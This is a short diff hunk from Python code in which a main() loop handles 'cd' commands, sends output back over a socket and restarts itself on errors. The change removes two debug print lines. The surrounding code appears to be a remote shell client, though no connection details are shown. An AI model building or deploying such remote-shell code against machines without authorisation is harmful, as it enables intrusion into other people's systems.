@@ -21,11 +21,9 @@ def main():
             if data.startswith("cd")==True:
                 os.chdir(data[3:].replace('\n', ''))
             sock.send(o)
-            print("AA")
 
         except Exception as error:
             print(error)
-            print("BGB")
             main()
 
 
